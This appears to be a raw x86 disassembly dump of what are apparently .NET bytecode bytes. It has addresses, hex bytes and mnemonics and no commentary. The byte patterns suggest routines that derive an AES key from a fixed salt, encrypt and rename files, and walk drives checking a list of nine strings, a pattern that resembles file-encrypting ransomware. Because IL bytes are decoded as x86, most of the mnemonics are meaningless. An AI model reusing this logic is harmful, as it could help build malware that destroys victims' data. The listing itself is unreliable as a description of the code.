  40259a:	32 d6                	xor    %dh,%dl
  40259c:	06                   	push   %es
  40259d:	6f                   	outsl  %ds:(%esi),(%dx)
  40259e:	1e                   	push   %ds
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	0a 2a                	or     (%edx),%ch
  4025a3:	00 00                	add    %al,(%eax)
  4025a5:	00 00                	add    %al,(%eax)
  4025a7:	00 01                	add    %al,(%ecx)
  4025a9:	02 03                	add    (%ebx),%al
  4025ab:	04 05                	add    $0x5,%al
  4025ad:	06                   	push   %es
  4025ae:	07                   	pop    %es
  4025af:	08 1b                	or     %bl,(%ebx)
  4025b1:	30 04 00             	xor    %al,(%eax,%eax,1)
  4025b4:	45                   	inc    %ebp
  4025b5:	01 00                	add    %eax,(%eax)
  4025b7:	00 09                	add    %cl,(%ecx)
  4025b9:	00 00                	add    %al,(%eax)
  4025bb:	11 02                	adc    %eax,(%edx)
  4025bd:	72 8a                	jb     0x402549
  4025bf:	05 00 70 1a 28       	add    $0x281a7000,%eax
  4025c4:	07                   	pop    %es
  4025c5:	00 00                	add    %al,(%eax)
  4025c7:	06                   	push   %es
  4025c8:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  4025cb:	00 0a                	add    %cl,(%edx)
  4025cd:	0a 1e                	or     (%esi),%bl
  4025cf:	8d 25 00 00 01 25    	lea    0x25010000,%esp
  4025d5:	d0 25 00 00 04 28    	shlb   $1,0x28040000
  4025db:	34 00                	xor    $0x0,%al
  4025dd:	00 0a                	add    %cl,(%edx)
  4025df:	0b 06                	or     (%esi),%eax
  4025e1:	18 73 35             	sbb    %dh,0x35(%ebx)
  4025e4:	00 00                	add    %al,(%eax)
  4025e6:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4025e9:	1f                   	pop    %ds
  4025ea:	00 00                	add    %al,(%eax)
  4025ec:	0a 03                	or     (%ebx),%al
  4025ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ef:	20 00                	and    %al,(%eax)
  4025f1:	00 0a                	add    %cl,(%edx)
  4025f3:	0d 73 36 00 00       	or     $0x3673,%eax
  4025f8:	0a 13                	or     (%ebx),%dl
  4025fa:	04 11                	add    $0x11,%al
  4025fc:	04 20                	add    $0x20,%al
  4025fe:	00 01                	add    %al,(%ecx)
  402600:	00 00                	add    %al,(%eax)
  402602:	6f                   	outsl  %ds:(%esi),(%dx)
  402603:	37                   	aaa
  402604:	00 00                	add    %al,(%eax)
  402606:	0a 11                	or     (%ecx),%dl
  402608:	04 20                	add    $0x20,%al
  40260a:	80 00 00             	addb   $0x0,(%eax)
  40260d:	00 6f 38             	add    %ch,0x38(%edi)
  402610:	00 00                	add    %al,(%eax)
  402612:	0a 11                	or     (%ecx),%dl
  402614:	04 18                	add    $0x18,%al
  402616:	6f                   	outsl  %ds:(%esi),(%dx)
  402617:	39 00                	cmp    %eax,(%eax)
  402619:	00 0a                	add    %cl,(%edx)
  40261b:	09 07                	or     %eax,(%edi)
  40261d:	17                   	pop    %ss
  40261e:	73 3a                	jae    0x40265a
  402620:	00 00                	add    %al,(%eax)
  402622:	0a 13                	or     (%ebx),%dl
  402624:	05 11 04 11 05       	add    $0x5110411,%eax
  402629:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40262c:	3b 00                	cmp    (%eax),%eax
  40262e:	00 0a                	add    %cl,(%edx)
  402630:	1e                   	push   %ds
  402631:	5b                   	pop    %ebx
  402632:	6f                   	outsl  %ds:(%esi),(%dx)
  402633:	3c 00                	cmp    $0x0,%al
  402635:	00 0a                	add    %cl,(%edx)
  402637:	6f                   	outsl  %ds:(%esi),(%dx)
  402638:	3d 00 00 0a 11       	cmp    $0x110a0000,%eax
  40263d:	04 11                	add    $0x11,%al
  40263f:	05 11 04 6f 3e       	add    $0x3e6f0411,%eax
  402644:	00 00                	add    %al,(%eax)
  402646:	0a 1e                	or     (%esi),%bl
  402648:	5b                   	pop    %ebx
  402649:	6f                   	outsl  %ds:(%esi),(%dx)
  40264a:	3c 00                	cmp    $0x0,%al
  40264c:	00 0a                	add    %cl,(%edx)
  40264e:	6f                   	outsl  %ds:(%esi),(%dx)
  40264f:	3f                   	aas
  402650:	00 00                	add    %al,(%eax)
  402652:	0a 11                	or     (%ecx),%dl
  402654:	04 1a                	add    $0x1a,%al
  402656:	6f                   	outsl  %ds:(%esi),(%dx)
  402657:	40                   	inc    %eax
  402658:	00 00                	add    %al,(%eax)
  40265a:	0a 08                	or     (%eax),%cl
  40265c:	07                   	pop    %es
  40265d:	16                   	push   %ss
  40265e:	07                   	pop    %es
  40265f:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402662:	41                   	inc    %ecx
  402663:	00 00                	add    %al,(%eax)
  402665:	0a 08                	or     (%eax),%cl
  402667:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  40266a:	42                   	inc    %edx
  40266b:	00 00                	add    %al,(%eax)
  40266d:	0a 17                	or     (%edi),%dl
  40266f:	73 43                	jae    0x4026b4
  402671:	00 00                	add    %al,(%eax)
  402673:	0a 13                	or     (%ebx),%dl
  402675:	06                   	push   %es
  402676:	02 19                	add    (%ecx),%bl
  402678:	73 35                	jae    0x4026af
  40267a:	00 00                	add    %al,(%eax)
  40267c:	0a 13                	or     (%ebx),%dl
  40267e:	07                   	pop    %es
  40267f:	11 07                	adc    %eax,(%edi)
  402681:	11 06                	adc    %eax,(%esi)
  402683:	6f                   	outsl  %ds:(%esi),(%dx)
  402684:	44                   	inc    %esp
  402685:	00 00                	add    %al,(%eax)
  402687:	0a 11                	or     (%ecx),%dl
  402689:	07                   	pop    %es
  40268a:	6f                   	outsl  %ds:(%esi),(%dx)
  40268b:	45                   	inc    %ebp
  40268c:	00 00                	add    %al,(%eax)
  40268e:	0a 11                	or     (%ecx),%dl
  402690:	07                   	pop    %es
  402691:	6f                   	outsl  %ds:(%esi),(%dx)
  402692:	46                   	inc    %esi
  402693:	00 00                	add    %al,(%eax)
  402695:	0a 11                	or     (%ecx),%dl
  402697:	06                   	push   %es
  402698:	6f                   	outsl  %ds:(%esi),(%dx)
  402699:	45                   	inc    %ebp
  40269a:	00 00                	add    %al,(%eax)
  40269c:	0a 11                	or     (%ecx),%dl
  40269e:	06                   	push   %es
  40269f:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a0:	46                   	inc    %esi
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	0a 08                	or     (%eax),%cl
  4026a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a6:	46                   	inc    %esi
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	0a 06                	or     (%esi),%al
  4026ab:	1c 18                	sbb    $0x18,%al
  4026ad:	73 47                	jae    0x4026f6
  4026af:	00 00                	add    %al,(%eax)
  4026b1:	0a 13                	or     (%ebx),%dl
  4026b3:	08 11                	or     %dl,(%ecx)
  4026b5:	08 73 48             	or     %dh,0x48(%ebx)
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	0a 13                	or     (%ebx),%dl
  4026bc:	09 11                	or     %edx,(%ecx)
  4026be:	09 04 6f             	or     %eax,(%edi,%ebp,2)
  4026c1:	49                   	dec    %ecx
  4026c2:	00 00                	add    %al,(%eax)
  4026c4:	0a 11                	or     (%ecx),%dl
  4026c6:	09 6f 4a             	or     %ebp,0x4a(%edi)
  4026c9:	00 00                	add    %al,(%eax)
  4026cb:	0a 11                	or     (%ecx),%dl
  4026cd:	09 6f 4b             	or     %ebp,0x4b(%edi)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	0a de                	or     %dh,%bl
  4026d4:	0c 11                	or     $0x11,%al
  4026d6:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  4026d9:	11 09                	adc    %ecx,(%ecx)
  4026db:	6f                   	outsl  %ds:(%esi),(%dx)
  4026dc:	4c                   	dec    %esp
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	0a dc                	or     %ah,%bl
  4026e1:	de 0c 11             	fimuls (%ecx,%edx,1)
  4026e4:	08 2c 07             	or     %ch,(%edi,%eax,1)
  4026e7:	11 08                	adc    %ecx,(%eax)
  4026e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4026ea:	4c                   	dec    %esp
  4026eb:	00 00                	add    %al,(%eax)
  4026ed:	0a dc                	or     %ah,%bl
  4026ef:	02 72 8e             	add    -0x72(%edx),%dh
  4026f2:	05 00 70 28 4d       	add    $0x4d287000,%eax
  4026f7:	00 00                	add    %al,(%eax)
  4026f9:	0a 02                	or     (%edx),%al
  4026fb:	28 4e 00             	sub    %cl,0x0(%esi)
  4026fe:	00 0a                	add    %cl,(%edx)
  402700:	2a 00                	sub    (%eax),%al
  402702:	00 00                	add    %al,(%eax)
  402704:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  402707:	00 02                	add    %al,(%edx)
  402709:	00 01                	add    %al,(%ecx)
  40270b:	01 18                	add    %ebx,(%eax)
  40270d:	19 01                	sbb    %eax,(%ecx)
  40270f:	0c 00                	or     $0x0,%al
  402711:	00 00                	add    %al,(%eax)
  402713:	00 02                	add    %al,(%edx)
  402715:	00 f8                	add    %bh,%al
  402717:	00 2f                	add    %ch,(%edi)
  402719:	27                   	daa
  40271a:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 01                	add    %al,(%ecx)
  402721:	02 03                	add    (%ebx),%al
  402723:	04 05                	add    $0x5,%al
  402725:	06                   	push   %es
  402726:	07                   	pop    %es
  402727:	08 1b                	or     %bl,(%ebx)
  402729:	30 04 00             	xor    %al,(%eax,%eax,1)
  40272c:	f5                   	cmc
  40272d:	00 00                	add    %al,(%eax)
  40272f:	00 0a                	add    %cl,(%edx)
  402731:	00 00                	add    %al,(%eax)
  402733:	11 28                	adc    %ebp,(%eax)
  402735:	4f                   	dec    %edi
  402736:	00 00                	add    %al,(%eax)
  402738:	0a 03                	or     (%ebx),%al
  40273a:	6f                   	outsl  %ds:(%esi),(%dx)
  40273b:	20 00                	and    %al,(%eax)
  40273d:	00 0a                	add    %cl,(%edx)
  40273f:	0a 1e                	or     (%esi),%bl
  402741:	8d 25 00 00 01 25    	lea    0x25010000,%esp
  402747:	d0 26                	shlb   $1,(%esi)
  402749:	00 00                	add    %al,(%eax)
  40274b:	04 28                	add    $0x28,%al
  40274d:	34 00                	xor    $0x0,%al
  40274f:	00 0a                	add    %cl,(%edx)
  402751:	0b 02                	or     (%edx),%eax
  402753:	72 8a                	jb     0x4026df
  402755:	05 00 70 1a 28       	add    $0x281a7000,%eax
  40275a:	07                   	pop    %es
  40275b:	00 00                	add    %al,(%eax)
  40275d:	06                   	push   %es
  40275e:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402761:	00 0a                	add    %cl,(%edx)
  402763:	18 73 35             	sbb    %dh,0x35(%ebx)
  402766:	00 00                	add    %al,(%eax)
  402768:	0a 0c 73             	or     (%ebx,%esi,2),%cl
  40276b:	36 00 00             	add    %al,%ss:(%eax)
  40276e:	0a 0d 09 20 00 01    	or     0x1002009,%cl
  402774:	00 00                	add    %al,(%eax)
  402776:	6f                   	outsl  %ds:(%esi),(%dx)
  402777:	37                   	aaa
  402778:	00 00                	add    %al,(%eax)
  40277a:	0a 09                	or     (%ecx),%cl
  40277c:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  402782:	38 00                	cmp    %al,(%eax)
  402784:	00 0a                	add    %cl,(%edx)
  402786:	06                   	push   %es
  402787:	07                   	pop    %es
  402788:	20 e8                	and    %ch,%al
  40278a:	03 00                	add    (%eax),%eax
  40278c:	00 73 3a             	add    %dh,0x3a(%ebx)
  40278f:	00 00                	add    %al,(%eax)
  402791:	0a 13                	or     (%ebx),%dl
  402793:	04 09                	add    $0x9,%al
  402795:	11 04 09             	adc    %eax,(%ecx,%ecx,1)
  402798:	6f                   	outsl  %ds:(%esi),(%dx)
  402799:	3b 00                	cmp    (%eax),%eax
  40279b:	00 0a                	add    %cl,(%edx)
  40279d:	1e                   	push   %ds
  40279e:	5b                   	pop    %ebx
  40279f:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a0:	3c 00                	cmp    $0x0,%al
  4027a2:	00 0a                	add    %cl,(%edx)
  4027a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027a5:	3d 00 00 0a 09       	cmp    $0x90a0000,%eax
  4027aa:	11 04 09             	adc    %eax,(%ecx,%ecx,1)
  4027ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ae:	3e 00 00             	add    %al,%ds:(%eax)
  4027b1:	0a 1e                	or     (%esi),%bl
  4027b3:	5b                   	pop    %ebx
  4027b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4027b5:	3c 00                	cmp    $0x0,%al
  4027b7:	00 0a                	add    %cl,(%edx)
  4027b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4027ba:	3f                   	aas
  4027bb:	00 00                	add    %al,(%eax)
  4027bd:	0a 09                	or     (%ecx),%cl
  4027bf:	19 6f 39             	sbb    %ebp,0x39(%edi)
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	0a 09                	or     (%ecx),%cl
  4027c6:	17                   	pop    %ss
  4027c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c8:	40                   	inc    %eax
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	0a 08                	or     (%eax),%cl
  4027cd:	09 6f 42             	or     %ebp,0x42(%edi)
  4027d0:	00 00                	add    %al,(%eax)
  4027d2:	0a 17                	or     (%edi),%dl
  4027d4:	73 43                	jae    0x402819
  4027d6:	00 00                	add    %al,(%eax)
  4027d8:	0a 13                	or     (%ebx),%dl
  4027da:	05 02 19 73 35       	add    $0x35731902,%eax
  4027df:	00 00                	add    %al,(%eax)
  4027e1:	0a 13                	or     (%ebx),%dl
  4027e3:	06                   	push   %es
  4027e4:	11 06                	adc    %eax,(%esi)
  4027e6:	11 05 6f 44 00 00    	adc    %eax,0x446f
  4027ec:	0a 11                	or     (%ecx),%dl
  4027ee:	06                   	push   %es
  4027ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f0:	45                   	inc    %ebp
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	0a 11                	or     (%ecx),%dl
  4027f5:	05 6f 45 00 00       	add    $0x456f,%eax
  4027fa:	0a 11                	or     (%ecx),%dl
  4027fc:	06                   	push   %es
  4027fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4027fe:	46                   	inc    %esi
  4027ff:	00 00                	add    %al,(%eax)
  402801:	0a 11                	or     (%ecx),%dl
  402803:	05 6f 46 00 00       	add    $0x466f,%eax
  402808:	0a de                	or     %dh,%bl
  40280a:	0c 11                	or     $0x11,%al
  40280c:	05 2c 07 11 05       	add    $0x511072c,%eax
  402811:	6f                   	outsl  %ds:(%esi),(%dx)
  402812:	4c                   	dec    %esp
  402813:	00 00                	add    %al,(%eax)
  402815:	0a dc                	or     %ah,%bl
  402817:	02 72 8e             	add    -0x72(%edx),%dh
  40281a:	05 00 70 28 4d       	add    $0x4d287000,%eax
  40281f:	00 00                	add    %al,(%eax)
  402821:	0a 02                	or     (%edx),%al
  402823:	28 4e 00             	sub    %cl,0x0(%esi)
  402826:	00 0a                	add    %cl,(%edx)
  402828:	2a 00                	sub    (%eax),%al
  40282a:	00 00                	add    %al,(%eax)
  40282c:	01 10                	add    %edx,(%eax)
  40282e:	00 00                	add    %al,(%eax)
  402830:	02 00                	add    (%eax),%al
  402832:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402833:	00 30                	add    %dh,(%eax)
  402835:	d7                   	xlat   %ds:(%ebx)
  402836:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402839:	00 00                	add    %al,(%eax)
  40283b:	00 1b                	add    %bl,(%ebx)
  40283d:	30 04 00             	xor    %al,(%eax,%eax,1)
  402840:	45                   	inc    %ebp
  402841:	00 00                	add    %al,(%eax)
  402843:	00 0b                	add    %cl,(%ebx)
  402845:	00 00                	add    %al,(%eax)
  402847:	11 28                	adc    %ebp,(%eax)
  402849:	10 00                	adc    %al,(%eax)
  40284b:	00 06                	add    %al,(%esi)
  40284d:	26 02 72 8a          	add    %es:-0x76(%edx),%dh
  402851:	05 00 70 1a 28       	add    $0x281a7000,%eax
  402856:	07                   	pop    %es
  402857:	00 00                	add    %al,(%eax)
  402859:	06                   	push   %es
  40285a:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  40285d:	00 0a                	add    %cl,(%edx)
  40285f:	18 18                	sbb    %bl,(%eax)
  402861:	16                   	push   %ss
  402862:	73 50                	jae    0x4028b4
  402864:	00 00                	add    %al,(%eax)
  402866:	0a 0a                	or     (%edx),%cl
  402868:	06                   	push   %es
  402869:	04 6f                	add    $0x6f,%al
  40286b:	51                   	push   %ecx
  40286c:	00 00                	add    %al,(%eax)
  40286e:	0a 02                	or     (%edx),%al
  402870:	72 8e                	jb     0x402800
  402872:	05 00 70 28 4d       	add    $0x4d287000,%eax
  402877:	00 00                	add    %al,(%eax)
  402879:	0a 02                	or     (%edx),%al
  40287b:	28 4e 00             	sub    %cl,0x0(%esi)
  40287e:	00 0a                	add    %cl,(%edx)
  402880:	de 0a                	fimuls (%edx)
  402882:	06                   	push   %es
  402883:	2c 06                	sub    $0x6,%al
  402885:	06                   	push   %es
  402886:	6f                   	outsl  %ds:(%esi),(%dx)
  402887:	4c                   	dec    %esp
  402888:	00 00                	add    %al,(%eax)
  40288a:	0a dc                	or     %ah,%bl
  40288c:	2a 00                	sub    (%eax),%al
  40288e:	00 00                	add    %al,(%eax)
  402890:	01 10                	add    %edx,(%eax)
  402892:	00 00                	add    %al,(%eax)
  402894:	02 00                	add    (%eax),%al
  402896:	20 00                	and    %al,(%eax)
  402898:	1a 3a                	sbb    (%edx),%bh
  40289a:	00 0a                	add    %cl,(%edx)
  40289c:	00 00                	add    %al,(%eax)
  40289e:	00 00                	add    %al,(%eax)
  4028a0:	1b 30                	sbb    (%eax),%esi
  4028a2:	02 00                	add    (%eax),%al
  4028a4:	30 00                	xor    %al,(%eax)
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	0c 00                	or     $0x0,%al
  4028aa:	00 11                	add    %dl,(%ecx)
  4028ac:	1f                   	pop    %ds
  4028ad:	20 8d 25 00 00 01    	and    %cl,0x1000025(%ebp)
  4028b3:	0a 73 52             	or     0x52(%ebx),%dh
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	0a 0b                	or     (%ebx),%cl
  4028ba:	16                   	push   %ss
  4028bb:	0c 2b                	or     $0x2b,%al
  4028bd:	0b 07                	or     (%edi),%eax
  4028bf:	06                   	push   %es
  4028c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4028c1:	53                   	push   %ebx
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	0a 08                	or     (%eax),%cl
  4028c6:	17                   	pop    %ss
  4028c7:	58                   	pop    %eax
  4028c8:	0c 08                	or     $0x8,%al
  4028ca:	1f                   	pop    %ds
  4028cb:	0a 32                	or     (%edx),%dh
  4028cd:	f0 de 0a             	lock fimuls (%edx)
  4028d0:	07                   	pop    %es
  4028d1:	2c 06                	sub    $0x6,%al
  4028d3:	07                   	pop    %es
  4028d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d5:	4c                   	dec    %esp
  4028d6:	00 00                	add    %al,(%eax)
  4028d8:	0a dc                	or     %ah,%bl
  4028da:	06                   	push   %es
  4028db:	2a 01                	sub    (%ecx),%al
  4028dd:	10 00                	adc    %al,(%eax)
  4028df:	00 02                	add    %al,(%edx)
  4028e1:	00 0e                	add    %cl,(%esi)
  4028e3:	00 16                	add    %dl,(%esi)
  4028e5:	24 00                	and    $0x0,%al
  4028e7:	0a 00                	or     (%eax),%al
  4028e9:	00 00                	add    %al,(%eax)
  4028eb:	00 1b                	add    %bl,(%ebx)
  4028ed:	30 03                	xor    %al,(%ebx)
  4028ef:	00 4d 00             	add    %cl,0x0(%ebp)
  4028f2:	00 00                	add    %al,(%eax)
  4028f4:	0d 00 00 11 28       	or     $0x28110000,%eax
  4028f9:	1f                   	pop    %ds
  4028fa:	00 00                	add    %al,(%eax)
  4028fc:	0a 02                	or     (%edx),%al
  4028fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ff:	20 00                	and    %al,(%eax)
  402901:	00 0a                	add    %cl,(%edx)
  402903:	0a 20                	or     (%eax),%ah
  402905:	00 08                	add    %cl,(%eax)
  402907:	00 00                	add    %al,(%eax)
  402909:	73 54                	jae    0x40295f
  40290b:	00 00                	add    %al,(%eax)
  40290d:	0a 0b                	or     (%ebx),%cl
  40290f:	07                   	pop    %es
  402910:	03 6f 1e             	add    0x1e(%edi),%ebp
  402913:	00 00                	add    %al,(%eax)
  402915:	0a 6f 55             	or     0x55(%edi),%ch
  402918:	00 00                	add    %al,(%eax)
  40291a:	0a 07                	or     (%edi),%al
  40291c:	06                   	push   %es
  40291d:	17                   	pop    %ss
  40291e:	6f                   	outsl  %ds:(%esi),(%dx)
  40291f:	56                   	push   %esi
  402920:	00 00                	add    %al,(%eax)
  402922:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402925:	28 21                	sub    %ah,(%ecx)
  402927:	00 00                	add    %al,(%eax)
  402929:	0a 0d 09 13 04 de    	or     0xde041309,%cl
  40292f:	12 07                	adc    (%edi),%al
  402931:	16                   	push   %ss
  402932:	6f                   	outsl  %ds:(%esi),(%dx)
  402933:	57                   	push   %edi
  402934:	00 00                	add    %al,(%eax)
  402936:	0a dc                	or     %ah,%bl
  402938:	07                   	pop    %es
  402939:	2c 06                	sub    $0x6,%al
  40293b:	07                   	pop    %es
  40293c:	6f                   	outsl  %ds:(%esi),(%dx)
  40293d:	4c                   	dec    %esp
  40293e:	00 00                	add    %al,(%eax)
  402940:	0a dc                	or     %ah,%bl
  402942:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  402945:	00 00                	add    %al,(%eax)
  402947:	00 01                	add    %al,(%ecx)
  402949:	1c 00                	sbb    $0x0,%al
  40294b:	00 02                	add    %al,(%edx)
  40294d:	00 17                	add    %dl,(%edi)
  40294f:	00 21                	add    %ah,(%ecx)
  402951:	38 00                	cmp    %al,(%eax)
  402953:	08 00                	or     %al,(%eax)
  402955:	00 00                	add    %al,(%eax)
  402957:	00 02                	add    %al,(%edx)
  402959:	00 17                	add    %dl,(%edi)
  40295b:	00 29                	add    %ch,(%ecx)
  40295d:	40                   	inc    %eax
  40295e:	00 0a                	add    %cl,(%edx)
  402960:	00 00                	add    %al,(%eax)
  402962:	00 00                	add    %al,(%eax)
  402964:	1e                   	push   %ds
  402965:	02 28                	add    (%eax),%ch
  402967:	22 00                	and    (%eax),%al
  402969:	00 0a                	add    %cl,(%edx)
  40296b:	2a 36                	sub    (%esi),%dh
  40296d:	03 02                	add    (%edx),%eax
  40296f:	7b 27                	jnp    0x402998
  402971:	00 00                	add    %al,(%eax)
  402973:	04 28                	add    $0x28,%al
  402975:	17                   	pop    %ss
  402976:	00 00                	add    %al,(%eax)
  402978:	0a 2a                	or     (%edx),%ch
  40297a:	00 00                	add    %al,(%eax)
  40297c:	13 30                	adc    (%eax),%esi
  40297e:	03 00                	add    (%eax),%eax
  402980:	ff 00                	incl   (%eax)
  402982:	00 00                	add    %al,(%eax)
  402984:	0e                   	push   %cs
  402985:	00 00                	add    %al,(%eax)
  402987:	11 28                	adc    %ebp,(%eax)
  402989:	58                   	pop    %eax
  40298a:	00 00                	add    %al,(%eax)
  40298c:	0a 13                	or     (%ebx),%dl
  40298e:	07                   	pop    %es
  40298f:	16                   	push   %ss
  402990:	13 08                	adc    (%eax),%ecx
  402992:	38 e4                	cmp    %ah,%ah
  402994:	00 00                	add    %al,(%eax)
  402996:	00 11                	add    %dl,(%ecx)
  402998:	07                   	pop    %es
  402999:	11 08                	adc    %ecx,(%eax)
  40299b:	9a 0a 72 92 05 00 70 	lcall  $0x7000,$0x592720a
  4029a2:	0b 06                	or     (%esi),%eax
  4029a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4029a5:	1e                   	push   %ds
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	0a 07                	or     (%edi),%al
  4029aa:	28 17                	sub    %dl,(%edi)
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	0a 39                	or     (%ecx),%bh
  4029b0:	b6 00                	mov    $0x0,%dh
  4029b2:	00 00                	add    %al,(%eax)
  4029b4:	1f                   	pop    %ds
  4029b5:	09 8d 15 00 00 01    	or     %ecx,0x1000015(%ebp)
  4029bb:	13 09                	adc    (%ecx),%ecx
  4029bd:	11 09                	adc    %ecx,(%ecx)
  4029bf:	16                   	push   %ss
  4029c0:	72 9a                	jb     0x40295c
  4029c2:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4029c7:	09 17                	or     %edx,(%edi)
  4029c9:	72 b6                	jb     0x402981
  4029cb:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4029d0:	09 18                	or     %ebx,(%eax)
  4029d2:	72 de                	jb     0x4029b2
  4029d4:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4029d9:	09 19                	or     %ebx,(%ecx)
  4029db:	72 ee                	jb     0x4029cb
  4029dd:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4029e2:	09 1a                	or     %ebx,(%edx)
  4029e4:	72 fa                	jb     0x4029e0
  4029e6:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4029eb:	09 1b                	or     %ebx,(%ebx)
  4029ed:	72 0c                	jb     0x4029fb
  4029ef:	06                   	push   %es
  4029f0:	00 70 a2             	add    %dh,-0x5e(%eax)
  4029f3:	11 09                	adc    %ecx,(%ecx)
  4029f5:	1c 72                	sbb    $0x72,%al
  4029f7:	24 06                	and    $0x6,%al
  4029f9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4029fc:	11 09                	adc    %ecx,(%ecx)
  4029fe:	1d 72 2c 06 00       	sbb    $0x62c72,%eax
  402a03:	70 a2                	jo     0x4029a7
  402a05:	11 09                	adc    %ecx,(%ecx)
  402a07:	1e                   	push   %ds
  402a08:	72 3a                	jb     0x402a44
  402a0a:	06                   	push   %es
  402a0b:	00 70 a2             	add    %dh,-0x5e(%eax)
  402a0e:	11 09                	adc    %ecx,(%ecx)
  402a10:	0c 07                	or     $0x7,%al
  402a12:	28 2f                	sub    %ch,(%edi)
  402a14:	00 00                	add    %al,(%eax)
  402a16:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  402a1c:	44                   	inc    %esp
  402a1d:	73 31                	jae    0x402a50
  402a1f:	00 00                	add    %al,(%eax)
  402a21:	06                   	push   %es
  402a22:	13 06                	adc    (%esi),%eax
  402a24:	09 11                	or     %edx,(%ecx)
  402a26:	04 9a                	add    $0x9a,%al
  402a28:	73 59                	jae    0x402a83
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	0a 13                	or     (%ebx),%dl
  402a2e:	05 11 06 11 05       	add    $0x5110611,%eax
  402a33:	6f                   	outsl  %ds:(%esi),(%dx)
  402a34:	5a                   	pop    %edx
  402a35:	00 00                	add    %al,(%eax)
  402a37:	0a 7d 27             	or     0x27(%ebp),%bh
  402a3a:	00 00                	add    %al,(%eax)
  402a3c:	04 08                	add    $0x8,%al
  402a3e:	11 06                	adc    %eax,(%esi)
  402a40:	fe 06                	incb   (%esi)
  402a42:	32 00                	xor    (%eax),%al
  402a44:	00 06                	add    %al,(%esi)
  402a46:	73 27                	jae    0x402a6f
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	0a 28                	or     (%eax),%ch
  402a4c:	01 00                	add    %eax,(%eax)
  402a4e:	00 2b                	add    %ch,(%ebx)
  402a50:	2d 09 09 11 04       	sub    $0x4110909,%eax
  402a55:	9a 28 09 00 00 06 11 	lcall  $0x1106,$0x928
  402a5c:	04 17                	add    $0x17,%al
  402a5e:	58                   	pop    %eax
  402a5f:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a62:	04 09                	add    $0x9,%al
  402a64:	8e 69 32             	mov    0x32(%ecx),%gs
  402a67:	b5 2b                	mov    $0x2b,%ch
  402a69:	0b 06                	or     (%esi),%eax
  402a6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a6c:	1e                   	push   %ds
  402a6d:	00 00                	add    %al,(%eax)
  402a6f:	0a 28                	or     (%eax),%ch
  402a71:	09 00                	or     %eax,(%eax)
  402a73:	00 06                	add    %al,(%esi)
  402a75:	11 08                	adc    %ecx,(%eax)
  402a77:	17                   	pop    %ss
  402a78:	58                   	pop    %eax
  402a79:	13 08                	adc    (%eax),%ecx
  402a7b:	11 08                	adc    %ecx,(%eax)
  402a7d:	11 07                	adc    %eax,(%edi)
  402a7f:	8e 69 3f             	mov    0x3f(%ecx),%gs
  402a82:	11 ff                	adc    %edi,%edi
  402a84:	ff                   	(bad)
  402a85:	ff 2a                	ljmp   *(%edx)
  402a87:	00 1b                	add    %bl,(%ebx)
  402a89:	30 03                	xor    %al,(%ebx)
  402a8b:	00 ec                	add    %ch,%ah
  402a8d:	00 00                	add    %al,(%eax)
  402a8f:	00 0f                	add    %cl,(%edi)
  402a91:	00 00                	add    %al,(%eax)
  402a93:	11 02                	adc    %eax,(%edx)
  402a95:	0a 28                	or     (%eax),%ch
  402a97:	5b                   	pop    %ebx
  402a98:	00 00                	add    %al,(%eax)
  402a9a:	0a 6f 5c             	or     0x5c(%edi),%ch
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	0a 0b                	or     (%ebx),%cl
  402aa1:	28 16                	sub    %dl,(%esi)
  402aa3:	00 00                	add    %al,(%eax)
  402aa5:	0a 6f 0c             	or     0xc(%edi),%ch
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	0a 0c 1d 28 0e 00 00 	or     0xe28(,%ebx,1),%cl
